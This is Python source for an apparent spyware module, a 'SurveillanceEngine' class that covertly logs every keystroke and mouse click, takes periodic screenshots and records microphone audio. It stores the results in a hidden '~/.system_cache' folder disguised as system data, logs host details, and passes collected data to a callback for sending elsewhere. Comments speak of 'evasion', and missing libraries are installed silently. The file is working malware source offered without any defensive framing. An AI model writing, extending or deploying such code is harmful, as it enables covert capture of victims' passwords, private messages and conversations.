"""
Surveillance capabilities including keylogging, screenshots, and audio recording.
"""
import os
import time
import threading
import wave
import socket
import platform
from datetime import datetime
from typing import Optional, Callable

# Dynamic imports for evasion
try:
    from pynput import keyboard, mouse
    import sounddevice as sd
    import pyscreenshot as ImageGrab
except ImportError:
    # Install dependencies if missing
    import subprocess
    import sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput", "pyscreenshot", "sounddevice"])
    from pynput import keyboard, mouse
    import sounddevice as sd
    import pyscreenshot as ImageGrab

class SurveillanceEngine:
    def __init__(self, data_callback: Optional[Callable] = None):
        """
        Initialize surveillance engine with optional data callback.
        
        Args:
            data_callback: Function to call when data is collected
        """
        self.data_buffer = ""
        self.buffer_lock = threading.Lock()
        self.data_callback = data_callback
        self.is_running = False
        self.log_file = None
        self.screenshot_dir = None
        self.audio_dir = None
        
        # Initialize directories
        self._setup_directories()
    
    def _setup_directories(self):
        """Setup directories for storing collected data."""
        base_dir = os.path.join(os.path.expanduser("~"), ".system_cache")
        self.screenshot_dir = os.path.join(base_dir, "screenshots")
        self.audio_dir = os.path.join(base_dir, "audio")
        
        for directory in [base_dir, self.screenshot_dir, self.audio_dir]:
            os.makedirs(directory, exist_ok=True)
    
    def _get_system_info(self) -> str:
        """Collect system information."""
        try:
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            system_info = f"""
[System Information]
Hostname: {hostname}
IP Address: {ip_address}
Platform: {platform.system()} {platform.release()}
Processor: {platform.processor()}
Machine: {platform.machine()}
Architecture: {platform.architecture()[0]}
Python Version: {platform.python_version()}
Timestamp: {datetime.now().isoformat()}
"""
            return system_info
        except Exception:
            return f"[System Info] Timestamp: {datetime.now().isoformat()}\n"
    
    def _on_key_press(self, key):
        """Handle key press events."""
        try:
            # Convert key to string representation
            if hasattr(key, 'char') and key.char:
                key_str = key.char
            elif key == keyboard.Key.space:
                key_str = ' '
            elif key == keyboard.Key.enter:
                key_str = '\n'
            elif key == keyboard.Key.tab:
                key_str = '\t'
            elif key == keyboard.Key.backspace:
                key_str = '[BACKSPACE]'
            elif key == keyboard.Key.delete:
                key_str = '[DELETE]'
            elif key == keyboard.Key.esc:
                key_str = '[ESC]'
            else:
                key_str = f'[{str(key)}]'
            
            with self.buffer_lock:
                self.data_buffer += key_str
                
                # Flush buffer if it gets too large
                if len(self.data_buffer) > 1000:
                    self._flush_buffer()
                    
        except Exception:
            pass
    
    def _on_mouse_click(self, x, y, button, pressed):
        """Handle mouse click events."""
        if pressed:
            mouse_event = f"\n[MOUSE] Click at ({x}, {y}) with {button}\n"
            with self.buffer_lock:
                self.data_buffer += mouse_event
    
    def _flush_buffer(self):
        """Flush data buffer to file and callback."""
        if not self.data_buffer:
            return
        
        data = self.data_buffer
        self.data_buffer = ""
        
        # Save to file
        if self.log_file:
            try:
                with open(self.log_file, 'a', encoding='utf-8') as f:
                    f.write(data)
            except Exception:
                pass
        
        # Call callback if provided
        if self.data_callback:
            try:
                self.data_callback(data)
            except Exception:
                pass
    
    def capture_screenshot(self) -> Optional[str]:
        """Capture screenshot and return file path."""
        try:
            timestamp = int(time.time())
            filename = f"screen_{timestamp}.png"
            filepath = os.path.join(self.screenshot_dir, filename)
            
            # Capture screenshot
            img = ImageGrab.grab()
            img.save(filepath)
            
            return filepath
        except Exception:
            return None
    
    def record_audio(self, duration: int = 10) -> Optional[str]:
        """Record audio for specified duration and return file path."""
        try:
            timestamp = int(time.time())
            filename = f"audio_{timestamp}.wav"
            filepath = os.path.join(self.audio_dir, filename)
            
            # Audio parameters
            sample_rate = 44100
            channels = 2
            
            # Record audio
            recording = sd.rec(
                int(duration * sample_rate),
                samplerate=sample_rate,
                channels=channels
            )
            sd.wait()
            
            # Save as WAV file
            with wave.open(filepath, 'wb') as f:
                f.setnchannels(channels)
                f.setsampwidth(2)  # 16-bit
                f.setframerate(sample_rate)
                f.writeframes(recording.tobytes())
            
            return filepath
        except Exception:
            return None
    
    def start_keylogger(self, log_file: Optional[str] = None):
        """Start keylogging."""
        if self.is_running:
            return
        
        self.log_file = log_file
        self.is_running = True
        
        # Add system info to log
        system_info = self._get_system_info()
        if self.log_file:
            try:
                with open(self.log_file, 'w', encoding='utf-8') as f:
                    f.write(system_info)
            except Exception:
                pass
        
        # Start keyboard and mouse listeners
        self.keyboard_listener = keyboard.Listener(on_press=self._on_key_press)
        self.mouse_listener = mouse.Listener(on_click=self._on_mouse_click)
        
        self.keyboard_listener.start()
        self.mouse_listener.start()
        
        # Start periodic buffer flush
        self._start_buffer_flush()
    
    def _start_buffer_flush(self):
        """Start periodic buffer flushing."""
        def flush_periodically():
            while self.is_running:
                time.sleep(30)  # Flush every 30 seconds
                self._flush_buffer()
        
        self.flush_thread = threading.Thread(target=flush_periodically, daemon=True)
        self.flush_thread.start()
    
    def stop_keylogger(self):
        """Stop keylogging."""
        self.is_running = False
        
        # Flush remaining buffer
        self._flush_buffer()
        
        # Stop listeners
        if hasattr(self, 'keyboard_listener'):
            self.keyboard_listener.stop()
        if hasattr(self, 'mouse_listener'):
            self.mouse_listener.stop()
    
    def start_periodic_screenshots(self, interval: int = 300):
        """Start periodic screenshot capture."""
        def capture_periodically():
            while self.is_running:
                time.sleep(interval)
                try:
                    self.capture_screenshot()
                except Exception:
                    pass
        
        thread = threading.Thread(target=capture_periodically, daemon=True)
        thread.start()
        return thread
    
    def start_periodic_audio(self, interval: int = 600, duration: int = 10):
        """Start periodic audio recording."""
        def record_periodically():
            while self.is_running:
                time.sleep(interval)
                try:
                    self.record_audio(duration)
                except Exception:
                    pass
        
        thread = threading.Thread(target=record_periodically, daemon=True)
        thread.start()
        return thread 